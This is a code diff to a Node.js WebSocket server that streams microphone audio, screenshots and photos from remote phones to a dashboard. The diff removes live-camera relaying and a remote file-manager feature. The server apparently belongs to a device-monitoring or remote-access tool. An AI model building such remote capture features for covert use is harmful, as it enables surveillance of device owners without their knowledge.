@@ -10,11 +10,6 @@ const dashboardStore = require("../models/dashboardStore");
 const { broadcastToDashboard, broadcastToDeviceSubscribers } = require("../services/dashboardService");
 const { parseAudioPayload, buildAmplifiedPayload } = require("../utils/audio");
 const { saveUploadedPhoto } = require("../services/photoService");
-const {
-  handleFileInfo,
-  handleFileChunk,
-  handleFileError,
-} = require("../services/fileProxyService");
 
 const { DASHBOARD_MAX_BUFFERED_BYTES } = require("../config");
 
@@ -55,7 +50,6 @@ function handleAudioDevice(ws, req) {
       reason: "connected",
       internetOnline: true,
       callActive: false,
-      isWebRtcStreaming: false,
       batteryPct: null,
       charging: null,
       networkLocked: false,
@@ -141,7 +135,6 @@ function handleAudioDevice(ws, req) {
               dev.health = {
                 wsConnected: json.wsConnected !== false,
                 micCapturing: json.micCapturing === true,
-                isWebRtcStreaming: json.isWebRtcStreaming === true,
                 lastAudioChunkAt: Number(
                   json.lastAudioChunkSentAt || dev.health?.lastAudioChunkAt || 0,
                 ),
@@ -153,17 +146,17 @@ function handleAudioDevice(ws, req) {
                 streamCodecMode: String(
                   json.streamCodecMode || dev.health?.streamCodecMode || "auto",
                 ),
-                voiceProfile: String(json.voiceProfile || dev.health?.voiceProfile || "room"),
-                noiseDb: Number.isFinite(Number(json.noiseDb))
-                  ? Number(json.noiseDb)
-                  : null,
+                voiceProfile: String(json.voiceProfile || dev.health?.voiceProfile || "near"),
+                noiseDb: Number.isFinite(Number(json.noiseDb)) ? Number(json.noiseDb) : null,
                 internetOnline: json.internetOnline !== false,
                 callActive: json.callActive === true,
-                batteryPct: Number.isFinite(Number(json.batteryPct))
-                  ? Number(json.batteryPct)
-                  : null,
+                batteryPct: Number.isFinite(Number(json.batteryPct)) ? Number(json.batteryPct) : null,
                 charging: typeof json.charging === "boolean" ? json.charging : null,
                 lowNetwork: json.lowNetwork === true,
+                networkLagging: json.networkLagging === true,
+                audioDrops: Number(json.audioDrops || dev.health?.audioDrops || 0),
+                silenceDrops: Number(json.silenceDrops || dev.health?.silenceDrops || 0),
+                frameMs: Number(json.frameMs || dev.health?.frameMs || 20),
                 photoAi: json.photoAi !== false,
                 photoQuality: String(json.photoQuality || dev.health?.photoQuality || "normal"),
                 photoNight: String(json.photoNight || dev.health?.photoNight || "off"),
@@ -174,45 +167,16 @@ function handleAudioDevice(ws, req) {
                 netDownKbps: Number(json.netDownKbps || 0),
                 netUpKbps: Number(json.netUpKbps || 0),
                 netType: String(json.netType || "other"),
-                bitrateKbps: Number(json.bitrateKbps || 0),
                 networkLocked: json.networkLocked === true,
                 appLocked: json.appLocked === true,
                 gainLevel: Number.isFinite(Number(json.gainLevel)) ? Number(json.gainLevel) : 1.0,
               };
-              
-              console.log(`📊 [Health] ${deviceId}: ${json.reason || "periodic"} (WS=${json.wsConnected}, Mic=${json.micCapturing}, Bat=${json.batteryPct}%)`);
             }
             broadcastToDeviceSubscribers(deviceId, {
               type: "device_health",
               deviceId,
               health: dev?.health || null,
             });
-          } else if (
-            json.type === "webrtc_answer" ||
-            json.type === "webrtc_ice" ||
-            json.type === "webrtc_state"
-          ) {
-            // S-M4 fix: Update health.isWebRtcStreaming from webrtc_state messages
-            if (json.type === "webrtc_state") {
-              const dev = deviceStore.getDevice(deviceId);
-              if (dev && dev.health) {
-                if (json.state.startsWith("started_") || json.state.startsWith("ice_") || json.state.startsWith("pc_")) {
-                  if (json.state === "ice_disconnected" || json.state === "ice_failed" || json.state === "ice_timeout" || json.state === "ice_closed" ||
-                      json.state === "pc_disconnected" || json.state === "pc_failed" || json.state === "pc_closed") {
-                    dev.health.isWebRtcStreaming = false;
-                  } else {
-                    dev.health.isWebRtcStreaming = true;
-                  }
-                } else if (json.state === "stopped" || json.state.startsWith("aborted_") || json.state.endsWith("_fail")) {
-                  dev.health.isWebRtcStreaming = false;
-                }
-              }
-            }
-            broadcastToDeviceSubscribers(deviceId, { ...json, deviceId });
-          } else if (json.type === "file_info") {
-            handleFileInfo(json);
-          } else if (json.type === "file_error") {
-            handleFileError(json);
           } else if (json.type === "photo_upload" || json.type === "screenshot_upload") {
             const saved = saveUploadedPhoto(deviceId, json);
             if (saved) {
@@ -229,44 +193,6 @@ function handleAudioDevice(ws, req) {
                 ts: saved.ts,
               });
             }
-          } else if (json.type === "camera_live_frame") {
-            broadcastToDeviceSubscribers(deviceId, {
-              type: "camera_live_frame",
-              deviceId,
-              camera: String(json.camera || "rear").toLowerCase(),
-              quality: String(json.quality || "normal").toLowerCase(),
-              mime: String(json.mime || "image/jpeg"),
-              data: String(json.data || ""),
-              ts: Number(json.ts || Date.now()),
-            });
-            // Don't log frames to avoid stdout flood, but keep track
-          } else if (json.type === "file_manager_result") {
-            // File manager commands do not create an audio/WebRTC subscription.
-            // Broadcast with deviceId and let the dashboard filter the selected device.
-            console.log(`📁 [FileManager] ${deviceId}: ${json.action} → ${json.status}`);
-            broadcastToDashboard({
-              type: "file_manager_result",
-              deviceId,
-              action: String(json.action || ""),
-              status: String(json.status || "error"),
-              error: json.error || undefined,
-              path: json.path || undefined,
-              parentPath: json.parentPath || undefined,
-              items: json.items || undefined,
-              count: json.count || undefined,
-              data: json.data || undefined,
-              name: json.name || undefined,
-              size: json.size || undefined,
-              mime: json.mime || undefined,
-              oldPath: json.oldPath || undefined,
-              newPath: json.newPath || undefined,
-              transferId: json.transferId || undefined,
-              chunkIndex: json.chunkIndex,
-              totalChunks: json.totalChunks,
-              bytesWritten: json.bytesWritten,
-              totalSize: json.totalSize,
-              ts: Date.now(),
-            });
           } else if (json.type === "fcm_token") {
             const dev = deviceStore.getDevice(deviceId);
             if (dev) {
@@ -307,8 +233,9 @@ function handleAudioDevice(ws, req) {
     const dev = deviceStore.getDevice(deviceId);
     const buf = Buffer.from(data);
 
-    // BUG E: Log the first 4 bytes of every received binary frame
-    if (buf.length >= 4) {
+    // Keep binary diagnostics lightweight; per-frame logs add latency on weak hosts.
+    if (buf.length >= 4 && (!dev._lastBinaryHeaderLogAt || Date.now() - dev._lastBinaryHeaderLogAt > 10_000)) {
+      dev._lastBinaryHeaderLogAt = Date.now();
       console.log(`[Binary Frame] First 4 bytes: ${buf.slice(0, 4).toString('hex')}`);
     }
 
@@ -343,32 +270,7 @@ function handleAudioDevice(ws, req) {
           }
         } catch (_e) {}
       }
-      let hasCameraSubscribers = false;
-      dashboardStore.forEachClientSubscribedToDevice(deviceId, () => {
-        hasCameraSubscribers = true;
-      });
-      if (!hasCameraSubscribers) return;
-      dashboardStore.forEachClientSubscribedToDevice(deviceId, (client) => {
-        if (client.readyState !== WebSocket.OPEN) return;
-        if (client.bufferedAmount > DASHBOARD_MAX_BUFFERED_BYTES) return;
-        client.send(buf);
-      });
-      return; // Skip audio processing
-    } else if (buf.length >= 4 && buf[0] === 0x46 && buf[1] === 0x53) { // 'F', 'S'
-      const headerLen = (buf[2] << 8) | buf[3];
-      if (headerLen > 0 && buf.length >= 4 + headerLen) {
-        const headerJson = buf.subarray(4, 4 + headerLen).toString("utf8");
-        const fileBytes = buf.subarray(4 + headerLen);
-        try {
-          const header = JSON.parse(headerJson);
-          if (header?.type === "file_chunk") {
-            handleFileChunk(header, fileBytes);
-          }
-        } catch (_) {
-          // Ignore malformed file stream frames
-        }
-      }
-      return; // File chunks are not audio
+      return; // Photo/screenshot frames are not audio.
     }
     const wantsToRecord = false; // Recording feature removed
     let hasDashboardSubscribers = false;
@@ -462,6 +364,8 @@ function handleAudioDevice(ws, req) {
                 deviceId,
                 droppedFrames: client._droppedFrames,
                 buffered: client.bufferedAmount,
+                lowNetwork: true,
+                dropping: true,
                 ts: now,
               }),
             );
